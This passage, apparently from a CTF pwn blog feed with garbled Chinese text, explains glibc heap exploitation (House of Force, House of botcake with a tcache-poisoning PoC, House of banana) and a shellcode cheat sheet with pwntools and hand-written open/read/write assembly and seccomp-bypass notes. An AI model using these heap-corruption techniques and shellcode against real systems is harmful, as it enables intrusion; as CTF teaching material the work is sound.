<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å°</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="comment">// å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>House of Force é€»è¾‘å¦‚ä¸‹ï¼š</p>
</blockquote>
<p>é¦–å…ˆé€šè¿‡å †æº¢å‡ºä¹‹ç±»çš„æ‰‹æ®µï¼Œæ”¹å˜ topchunk çš„ size åŸŸä¸º
-1ï¼Œå³0xffffffffffffffff</p>
<p>åœ¨ <code>chunkFakealloc(size)</code> æ—¶ï¼Œé€šè¿‡æ„é€ 
sizeï¼ˆç”±äº<code>nb = request2size(size)</code>,æ‰€ä»¥æ„é€  nb
çš„æœ¬è´¨å°±æ˜¯æ„é€  sizeï¼‰ï¼Œåˆ‡å‰²ç¨‹åºä¼šè¿è¡Œåˆ°å¦‚ä¸‹ä»£ç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">av-&gt;top        = remainder;</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶ï¼Œremainder ä¼šè¢«èµ‹å€¼ä¸º victim + nbï¼Œè€Œä¸‹ä¸€è¡Œä»£ç 
<code>av-&gt;top = remainder</code> ä½¿å¾— main_arena ä¸­æŒ‡å‘ topchunk
çš„æŒ‡é’ˆè¢«ä¿®æ”¹</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè‹¥ nb ä¸ºè´Ÿæ•°ï¼Œvictim + nb ä¼šæº¢å‡ºï¼Œä»è€Œå°† victim
ä¿®æ”¹ä¸ºæ¯” victim è‡ªå·±æŒ‡å‘çš„åœ°å€æ›´ä½çš„åœ°å€ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡æ„é€  nbï¼Œæˆ‘ä»¬å¯ä»¥å°† av-&gt;top æ”¹å†™ä¸º
<code>Any Address</code></p>
<p>è€Œé€šè¿‡å†ä¸€æ¬¡çš„ <code>chunkNewalloc(nb)</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨
<code>Any Address</code> å¤„ç”³è¯·ä¸€ä¸ª chunkï¼Œè¿›è€Œå®ç°ä»»æ„åœ°å€å†™.</p>
<p>æ€»è€Œè¨€ä¹‹ï¼Œåœ¨æ”¹å˜ topchunk çš„ size åŸŸä¸º -1 ä¹‹åï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿç²¾å¿ƒæ„é€ 
<code>malloc(nb)</code> æ—¶çš„ nbï¼Œå°±å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ã€‚</p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥çš„é—®é¢˜å¾ˆæ˜¾ç„¶ï¼Œå¦‚ä½•æ„é€  nb ï¼Œä¹Ÿå°±æ˜¯å¦‚ä½•æ„é€  sizeï¼Ÿ</p>
<blockquote>
<p>size çš„æ„é€ </p>
</blockquote>
<p>malloc çš„è¿‡ç¨‹ä¸­ä¼šé‡åˆ°å¦‚ä¸‹æ£€æŸ¥ï¼Œ<code>req</code>å°±æ˜¯æˆ‘ä»¬ç”³è¯·çš„ chunk
çš„å¤§å°ï¼Œå°±æ˜¯å‰æ–‡æåˆ°çš„ request2sizeçš„å‚æ•°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// MINSIZE = 2 * SIZE_SZ</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ï¼Œ<code>SIZE_SZ</code> åœ¨ 64 ä½æ˜¯ 0x08ï¼Œ32 ä½ä¸º 0x04ï¼Œå› æ­¤
<code>MINSIZE</code> åœ¨ 64 ä½ä¸­æ˜¯ 0x10ï¼Œ32 ä½ä¸º 0x08</p>
<p>ç”±äº -2 * MINSIZE è¢«è½¬åŒ–ä¸ºäº†æ— ç¬¦å·æ•°ï¼Œæ‹¿ 64 ä½ä¸¾ä¾‹ï¼Œreq å¾ˆéš¾è¶…è¿‡
0xfffffffffffffff0
è¿™ä¹ˆå¤§çš„æ•°å­—ï¼Œæ‰€ä»¥è¿™ä¸ªæ£€æµ‹æ˜¯å¾ˆå¥½ç»•è¿‡çš„ï¼Œæˆ–è€…è¯´æ ¹æœ¬ä¸ç”¨ care
è¿™ä¸ªæ£€æµ‹ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œ<code>req</code>ä¼šç»è¿‡å¦‚ä¸‹å‡½æ•°ï¼Œè½¬åŒ–ä¸ºè¦ç”³è¯·çš„ chunk çš„ çœŸå®
sizeï¼Œä¹Ÿå°±æ˜¯ nb</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ï¼Œ<code>MALLOC_ALIGN_MASK</code> åœ¨ 64 ä½æ˜¯ 0xF å³ 1111bï¼Œ32ä½ä¸º
0x7 å³ 111b.</p>
<p><code>è¿™é‡Œæœ‰ç‚¹æ²¡æƒ³æ˜ç™½ request2size çš„è¿‡ç¨‹ï¼Œæˆ‘å…ˆå‡è®¾åœ¨ malloc(size) æ—¶ï¼Œnb = request2size(req) = request2size(size)</code></p>
<p>ç”±äº nb éƒ½æ˜¯å¯¹é½çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸ç”¨è€ƒè™‘
<code>&amp; ~MALLOC_ALIGN_MASK</code>ï¼Œæ‰€ä»¥ size = req = nb - SIZE_SZ -
MALLOC_ALIGN_MASK</p>
<p>è‡³æ­¤ï¼Œæˆ‘ä»¬æ„é€ å‡ºäº† sizeï¼ŒHOFç»“æŸ.</p>
<h2 id="house-of-botcake">[8-3] House of botcake</h2>
<blockquote>
<p>libc: 2.29 -</p>
</blockquote>
<h3 id="æ¦‚è¿°-8">[8-3-1] æ¦‚è¿°</h3>
<p>ç”±äº libc 2.29 ä¹‹ååŠ å…¥äº† tcachebin æ£€æŸ¥æœºåˆ¶ï¼Œæ‰€ä»¥ tcachebin double
free å˜å¾—æ²¡æœ‰é‚£ä¹ˆå¥½åˆ©ç”¨</p>
<p>ä½†ç”±äºæ”¾å…¥ unsortedbin ä¸­çš„ chunkï¼Œå†è¢« free è¿› tcachebin
çš„æ—¶å€™æ£€æµ‹ç›¸å½“è–„å¼±</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆæŠŠ chunk free è¿› unsortedbinï¼Œå† free è¿›
tcachebinï¼Œå½“æˆ‘ä»¬åˆ‡å‰² unsortedbin æ—¶å°±èƒ½ä¿®æ”¹ tcachebin é‡Œé‡å çš„ chunk çš„
fd/bkï¼Œé€ æˆ tcachebin poisoning</p>
<h3 id="poc-1">[8-3-2] POC</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    malloc(<span class="number">0x80</span>) <span class="comment"># idx0-6: tcache | idx7,8:unsorted</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment"># idx9: é˜²æ­¢ unsortedbin ä¸ topchunk åˆå¹¶</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i) <span class="comment"># idx0-6: tcache</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># chunk7 åå‘åˆå¹¶ chunk8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä» tcachebin[0x80] å–å‡ºä¸€ä¸ª chunkï¼Œæ­¤æ—¶ tcachebin é“¾åªå‰©å…­ä¸ª chunk</span></span><br><span class="line">malloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŠŠæœ¬åœ¨ unsortedbin ä¸­çš„ chunk8 æ”¾å…¥ tcachebin</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä» chunk7,8 åˆ‡å‰²ï¼Œä½†å®é™…ä¸Šå·²ç»è¦†ç›–äº† tcachebin chunk8 çš„ fd/bk æŒ‡é’ˆäº†</span></span><br><span class="line">malloc(<span class="number">0xa0</span>) </span><br></pre></td></tr></table></figure>
<h3 id="ä¸€äº›ç–‘é—®">[8-3-3] ä¸€äº›ç–‘é—®</h3>
<p>ä¸æ„é€  chunk 7ï¼Œç›´æ¥æŠŠ chunk8 æ”¾è¿› unsortedbin å†æ”¾è¿› tcachebin
ä¸­æ˜¯å®Œå…¨å¯è¡Œçš„ï¼Œä½†å½“æˆ‘åˆ‡å‰² chunk8 æ—¶å°±ä¼šæŠ¥é”™
<code>malloc(): unsorted double linked list corrupted\n</code></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x55dd5ca32690</span> â€”â–¸ <span class="number">0x55dd5ca32570</span> â€”â–¸ <span class="number">0x55dd5ca324e0</span> â€”â–¸ <span class="number">0x55dd5ca32450</span> â€”â–¸ <span class="number">0x55dd5ca323c0</span> â€”â–¸ <span class="number">0x55dd5ca32330</span> â€”â–¸ <span class="number">0x55dd5ca322a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted] <span class="comment">// æˆ–è®¸è·Ÿè¿™é‡Œæœ‰å…³ç³»ï¼Ÿ</span></span><br><span class="line"><span class="attr">FD</span>: <span class="number">0x55dd5ca32680</span> â€”â–¸ <span class="number">0x55dd5ca32570</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="attr">BK</span>: <span class="number">0x55dd5ca32680</span> â€”â–¸ <span class="number">0x55dd5ca32010</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>ç›®å‰çŒœæµ‹æ˜¯: ç›´æ¥æŠŠ chunk8 æ”¾è¿› tcachebin ä¼šå¯¼è‡´åŸæœ¬å­˜åœ¨ chunk8 fd/bk
å¤„çš„ &amp;main_arena+88 è¢«æ›¿æ¢ï¼Œå¯¼è‡´ malloc é”™è¯¯</p>
<h2 id="house-of-banana">[8-4] House of banana</h2>
<p>å…·ä½“ç»†èŠ‚å¯ä»¥çœ‹è¿™ç¯‡<a
href="https://www.secpulse.com/archives/180765.html">æ–‡ç« </a></p>
<h3 id="æ¦‚è¿°-9">[8-4-1] æ¦‚è¿°</h3>
<p>å½“ç¨‹åºæ˜¾å¼è°ƒç”¨<code>exit()</code>å‡½æ•°æ—¶ï¼Œç¨‹åºä¼šé€šè¿‡<code>exit -&gt; _dl_fini -&gt;((fini_t) array[i]) ()</code>è¿™æ¡è°ƒç”¨é“¾è°ƒç”¨
<code>array[i]()</code>ã€‚</p>
<p>è€Œ <code>array[i]()</code> æ˜¯é€šè¿‡
<code>_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</code>
å®šä½çš„</p>
<p>é€šè¿‡ largebin
attackï¼Œæˆ‘ä»¬å¯ä»¥ç¯¡æ”¹<code>_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</code>æŒ‡é’ˆï¼Œå°†å…¶å€¼ä¿®æ”¹ä¸ºæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å †åœ°å€ï¼Œ</p>
<p>è€Œé€šè¿‡åœ¨å †ä¸Šä¼ªé€ ä¸€ä¸ª link_map ç»“æ„ä½“ï¼Œæˆ‘ä»¬å¯ä»¥æ¬ºéª—ç¨‹åºï¼Œä½¿å…¶æ‰§è¡Œ
<code>array[i]()</code> æ—¶æ‰§è¡Œåœ¨ç»“æ„ä½“é‡Œæ”¾å…¥çš„ææƒå‡½æ•°ï¼Œè¿›è€Œææƒ</p>
<h3 id="poc-2">[8-4-2] POC</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># largebin attack ä¿®æ”¹ _rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€  fake chunk</span></span><br></pre></td></tr></table></figure>
<h3 id="å¦‚ä½•æ„é€ -fake_chunk">[8-4-3] å¦‚ä½•æ„é€  fake_chunk?</h3>
<p>è§ <a
href="https://heygap.github.io/2024/02/15/Pwn%20-%20IO_File%20and%20ld.so%20exploit%20summary/#more">Pwn
- IO_File and ld.so exploit summary</a></p>
<h2 id="house-of-pig">[8-5] House of pig</h2>
<p>https://bbs.kanxue.com/thread-268245.htm#msg_header_h3_2</p>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Shellcode Summary</title>
    <url>/2024/02/08/Pwn%20-%20Shellcode%20Summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
Shellcode ä¹Ÿæ˜¯ååˆ†æ ¸å¿ƒçš„æŠ€æœ¯ğŸ¤”
</blockquote>
<span id="more"></span>
<h1 id="manual">Manual</h1>
<p><a
href="https://blog.csdn.net/qq_29343201/article/details/52209588">linux
ç³»ç»Ÿè°ƒç”¨å·è¡¨</a></p>
<p><a href="https://docs.pwntools.com/en/stable/shellcraft.html">manual:
pwntools.shellcraft</a></p>
<h1 id="ç›®å½•">[0] ç›®å½•</h1>
<ol type="1">
<li><a href="#1-ç¼–å†™-shellcode">ç¼–å†™ shellcode</a>
<ul>
<li><a href="#1-1-shellcode-æ¿å­">shellcode æ¿å­</a></li>
<li><a href="#1-2-ç°æœ‰å·¥å…·">ç°æœ‰å·¥å…·</a></li>
<li><a href="#1-3-æ¿å­">æ¿å­</a></li>
</ul></li>
<li><a href="#2-shellcode-restrictions--bypass-é™åˆ¶ä¸ç»•è¿‡">shellcode
restrictions &amp; bypass (é™åˆ¶ä¸ç»•è¿‡)</a>
<ul>
<li><a href="#2-1-length-restrictions-é•¿åº¦çº¦æŸ">Length restrictions
(é•¿åº¦çº¦æŸ)</a></li>
<li><a href="#2-2-seccomp-ç¦ç”¨">seccomp ç¦ç”¨</a></li>
<li><a href="#2-3-alphanumeric-shellcode-å­—æ¯æ•°å­—æ„æˆ">alphanumeric
shellcode (å­—æ¯+æ•°å­—æ„æˆ)</a></li>
</ul></li>
<li><a href="#3-ä¾‹é¢˜">ä¾‹é¢˜</a></li>
<li><a href="#4-å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</a></li>
</ol>
<h1 id="ç¼–å†™-shellcode">[1] ç¼–å†™ shellcode</h1>
<h2 id="shellcode-æ¿å­">[1-1] shellcode æ¿å­</h2>
<ol type="1">
<li><p><a href="https://www.exploit-db.com/">exploit-db</a></p></li>
<li><p><a href="https://shell-storm.org/shellcode/index.html">Shellcodes
database for study cases(å·²åœæ­¢æ›´æ–°)</a></p>
<ul>
<li>è¿™ä¸ªè™½ç„¶åœæ›´äº†ä½†æ˜¯æŒºå¥½ç”¨çš„ï¼Œå¾ˆé€‚åˆæ‰¾ä¸€äº› length restrictions çš„
shellcode</li>
</ul></li>
</ol>
<h2 id="ç°æœ‰å·¥å…·">[1-2] ç°æœ‰å·¥å…·</h2>
<h3 id="pwntools">[1-2-1] Pwntools</h3>
<h4 id="shellcraft">[1-2-1-1] shellcraft</h4>
<ul>
<li><p><a
href="https://docs.pwntools.com/en/stable/shellcraft.html">Manual</a></p></li>
<li><p>é€Ÿæˆ (æ›´å¤šè¯· RTFM æˆ–æŸ¥çœ‹ [1-3] ) <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># arch: i386 / amd64</span></span><br><span class="line"><span class="comment"># os: linux</span></span><br><span class="line"><span class="comment"># func: open / read / write / mmap</span></span><br><span class="line">shellcode = shellcraft.arch.os.func(args)</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h4 id="asm">[1-2-1-2] asm</h4>
<ul>
<li>å®šä¹‰: <code>def asm(str) -&gt; bytes</code></li>
</ul>
<h2 id="æ¿å­">[1-3] æ¿å­</h2>
<ol type="1">
<li><p>å¸¸ç”¨ shellcraft</p>
<p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># open(&#x27;./flag&#x27;)</span></span><br><span class="line">shellcode_open = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(fd,addr,nbytes)</span></span><br><span class="line">shellcode_read = shellcraft.read(<span class="number">0</span>,<span class="number">0xBABECAFE</span>,<span class="number">0x80</span>)</span><br><span class="line"><span class="comment"># å…¶ä»–ç”¨æ³•: shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,0x100)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write(fd,addr,nbytes)</span></span><br><span class="line">shellcode_read = shellcraft.write(<span class="number">1</span>,<span class="number">0xBABECAFE</span>,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mmap(addr,len,prot,flags,fd,offset)</span></span><br><span class="line">shellcode_mmap = shellcraft.mmap(<span class="number">0xBABECAFE</span>,<span class="number">0x80</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p>ä¸ç”¨å †æ ˆçš„ <code>orw</code>ï¼Œå­—ç¬¦ä¸²"flag"éœ€è¦æå‰å¸ƒç½®å¥½.
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,0x2333008     # æŒ‡å‘&quot;flag\x00\x00\x00\x00&quot;çš„æŒ‡é’ˆ</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">syscall               # open(&#x27;./flag&#x27;)</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">mov rdi,3             # fd = 3</span></span><br><span class="line"><span class="string">mov rdx,0x50          # nbytes = 0x50</span></span><br><span class="line"><span class="string">mov esi,0x2333100     # address = 0x2333100</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">syscall               # read(3,0x2333100,0x50)</span></span><br><span class="line"><span class="string">mov rdi,1             # stdin = 1</span></span><br><span class="line"><span class="string">mov rdx,0x50          # nbytes = 0x50</span></span><br><span class="line"><span class="string">mov esi,0x2333100     # address = 0x2333100</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall               # write(1,0x2333100,0x50)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p></li>
</ol>
<h2 id="åœ¨çº¿ç½‘ç«™">[1-4] åœ¨çº¿ç½‘ç«™</h2>
<ol type="1">
<li><p><a href="defuse.ca">Online x86 and x64 Intel Instruction
Assembler</a>: åœ¨çº¿ç¼–å†™ shellcode å’Œåæ±‡ç¼– shellcodeï¼Œç›®å‰åªæ”¯æŒ
x86/x64</p></li>
<li><p><a href="shell-storm.org">Online Assembler and Disassembler</a>:
å¦ä¸€ä¸ªæ›´å…¨çš„åœ¨çº¿ç¼–å†™ shellcode å’Œåæ±‡ç¼– shellcode ç½‘ç«™</p></li>
<li><p><a href="shell-storm.org">Shellcodes database for study
cases</a>: shellcode æ•°æ®åº“ï¼Œæ”¯æŒå¾ˆå¤šæŒ‡ä»¤é›†ä¸æ“ä½œç³»ç»Ÿ</p></li>
<li><p><a href="exploit-db.com">Exploit Database Shellcodes</a>: å¦ä¸€ä¸ª
shellcode æ•°æ®åº“</p></li>
<li><p><a href="revshells.com">Online - Reverse Shell Generator</a>:
ç”Ÿæˆåå¼¹ shell çš„å‘½ä»¤</p></li>
</ol>
<h2 id="æ‰‹æ“-shellcode">[1-5] æ‰‹æ“ shellcode</h2>
<p>ä¼ å‚é¡ºåº: rdi,rsi,rdx,rcx,r8,r9</p>
<p>å­˜<a
href="https://blog.csdn.net/qq_29343201/article/details/52209588">ç³»ç»Ÿè°ƒç”¨å·</a>çš„å¯„å­˜å™¨:
rax</p>
<h2 id="c-ä»£ç æå–-shellcode">[1-6] C ä»£ç æå– shellcode</h2>
<p><a href="https://www.jianshu.com/p/5d1b1eafca21">çœ‹è¿™ç¯‡</a></p>
<h1 id="shellcode-restrictions-bypass-é™åˆ¶ä¸ç»•è¿‡">[2] shellcode
restrictions &amp; bypass (é™åˆ¶ä¸ç»•è¿‡)</h1>
<h2 id="length-restrictions-é•¿åº¦çº¦æŸ">[2-1] Length restrictions
(é•¿åº¦çº¦æŸ)</h2>
<h3 id="restriction">[2-1-1] restriction</h3>
<p>shellcode é™åˆ¶åœ¨ xx bytes ä»¥å†…</p>
<h3 id="bypass1---å‹ç¼©-shellcode">[2-1-2] bypass1 - å‹ç¼© shellcode</h3>
<ol start="0" type="1">
<li><p>æ„é€ ä¸€æ¬¡ SYS_read å†å»è¯»ä¸€é <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xchg rdi,rsi</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode) + <span class="string">b&#x27;\xeb\xf6&#x27;</span></span><br></pre></td></tr></table></figure> ä¸Šè¿° shellcode åªæœ‰
0x10 å¤§å°ï¼Œ</p></li>
<li><p>å¯ä»¥å» <a
href="https://shell-storm.org/shellcode/index.html">Shellcodes database
for study cases(å·²åœæ­¢æ›´æ–°)</a> æ‰¾æ¯”è¾ƒå°çš„ shellcode</p></li>
<li><p>å¸¸ç”¨å‹ç¼©æ–¹å¼</p>
<ol type="1">
<li><p>âš  è§‚å¯Ÿ <code>å¯„å­˜å™¨ + æ ˆ</code> çš„çŠ¶æ€</p></li>
<li><p>é•¿å¯„å­˜å™¨æ”¹ä¸ºçŸ­å¯„å­˜å™¨ <code>rax(8bytes)</code> -&gt;
<code>eax(4bytes)</code> -&gt; <code>ax(2bytes)</code> -&gt;
<code>ah/al(1byte)</code></p></li>
<li><p>ç½®é›¶</p>
<ol type="1">
<li><p><code>mov reg, 0</code> -&gt; <code>xor reg, reg</code></p></li>
<li><p>å¤šç”¨ <code>push / pop</code></p></li>
<li><p>å¤šç”¨ <code>cdq</code> æ¥å°† <code>rdx</code> ç½®é›¶</p></li>
<li><p>å¤šç”¨ <code>xchg</code> äº¤æ¢ <code>reg1</code> å’Œ
<code>reg2</code></p>
<ul>
<li>è§‚å¯Ÿæ‰§è¡Œ shellcode æ—¶çš„
contextï¼ˆä¸Šä¸‹æ–‡ï¼‰ï¼Œç”¨ä¸Šä¸‹æ–‡çš„ä¸€äº›å¯„å­˜å™¨æ¥åˆå§‹åŒ–</li>
</ul></li>
</ol></li>
</ol></li>
<li><p>æ²¡ä»€ä¹ˆç”¨çš„ç§¯ç´¯ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov edx,7   ---&gt;   cdq; mov dl,7</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h3 id="bypass2---äºŒæ¬¡-read">[2-1-3] bypass2 - äºŒæ¬¡ read</h3>
<h2 id="seccomp-ç¦ç”¨">[2-2] seccomp ç¦ç”¨</h2>
<h3 id="restriction-1">[2-2-1] restriction</h3>
<p>ç¨‹åºè°ƒç”¨ <code>seccomp</code> æˆ– <code>prctl</code>
ç¦ç”¨äº†æŸäº›ç³»ç»Ÿè°ƒç”¨</p>
<blockquote>
<p>æœ¬è´¨æ˜¯æ²™ç›’é€ƒé€¸ï¼Œåç»­æ‰“ç®—è¿™é‡Œåªç•™ä¸‹å¸¸ç”¨çš„æ±‡ç¼–è¯­å¥æˆ–è€…shellcraftè¯­æ³•ï¼ŒåŸç†æŒªåˆ°
<a href="">Pwn - Sandbox Escape Summary</a> ä¸­å»</p>
</blockquote>
<h3 id="bypass">[2-2-2] bypass</h3>
<blockquote>
<p>æœ¬è´¨æ˜¯å¯¹ IO stream
çš„æ±‡ç¼–è€ƒå¯Ÿï¼Œå­¦ä¹ è¿™ä¸€éƒ¨åˆ†åº”å½“ç§¯ç´¯è¶³å¤Ÿå¤šçš„ç›¸å…³çŸ¥è¯†ã€‚</p>
</blockquote>
<p><a
href="https://blog.csdn.net/qq_54218833/article/details/134205383">é¡¶çº§
seccomp æ–‡ç« </a></p>
<h4 id="open">open</h4>
<h4 id="read">read</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GPT æœ‰å…³ read çš„æ‹“å±•</span><br><span class="line"></span><br><span class="line">å¦‚æœ `read`ã€`pread64` å’Œ `readv` ç­‰ç³»ç»Ÿè°ƒç”¨è¢«ç¦ç”¨äº†ï¼Œä½ å¯èƒ½å¯ä»¥è€ƒè™‘ä½¿ç”¨å…¶ä»–çš„ç³»ç»Ÿè°ƒç”¨æ¥è¯»å–æ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¯èƒ½çš„æ›¿ä»£æ–¹æ¡ˆï¼š</span><br><span class="line"></span><br><span class="line">1. **mmap**: ä½¿ç”¨ `mmap` ç³»ç»Ÿè°ƒç”¨æ˜ å°„æ–‡ä»¶åˆ°å†…å­˜ä¸­ï¼Œç„¶åé€šè¿‡å†…å­˜è®¿é—®æ¥è¯»å–æ–‡ä»¶å†…å®¹ã€‚</span><br><span class="line"></span><br><span class="line">2. **open + read**: å¯ä»¥ä½¿ç”¨ `open` ç³»ç»Ÿè°ƒç”¨æ‰“å¼€æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ `read` æˆ–è€… `pread64` ç­‰ç³»ç»Ÿè°ƒç”¨æ¥è¯»å–æ–‡ä»¶å†…å®¹ã€‚</span><br><span class="line"></span><br><span class="line">3. **fopen + fread**: ä½¿ç”¨æ ‡å‡† C åº“å‡½æ•° `fopen` å’Œ `fread` æ¥æ‰“å¼€å’Œè¯»å–æ–‡ä»¶å†…å®¹ã€‚</span><br><span class="line"></span><br><span class="line">4. **openat + read**: ä½¿ç”¨ `openat` ç³»ç»Ÿè°ƒç”¨æ‰“å¼€æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ `read` æˆ–è€… `pread64` ç­‰ç³»ç»Ÿè°ƒç”¨æ¥è¯»å–æ–‡ä»¶å†…å®¹ã€‚</span><br><span class="line"></span><br><span class="line">5. **pipe + fork + exec**: åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œåœ¨å­è¿›ç¨‹ä¸­æ‰§è¡Œå‘½ä»¤æ¥è¯»å–æ–‡ä»¶å†…å®¹ï¼Œçˆ¶è¿›ç¨‹é€šè¿‡ç®¡é“è¯»å–å­è¿›ç¨‹çš„è¾“å‡ºã€‚</span><br><span class="line"></span><br><span class="line">6. **recv + recvfrom**: å¦‚æœä½ å¯ä»¥é€šè¿‡ç½‘ç»œä¼ è¾“æ–‡ä»¶ï¼Œä½ å¯ä»¥ä½¿ç”¨ `recv` æˆ– `recvfrom` ç­‰ç½‘ç»œå¥—æ¥å­—å‡½æ•°æ¥æ¥æ”¶æ–‡ä»¶æ•°æ®ã€‚</span><br><span class="line"></span><br><span class="line">7. 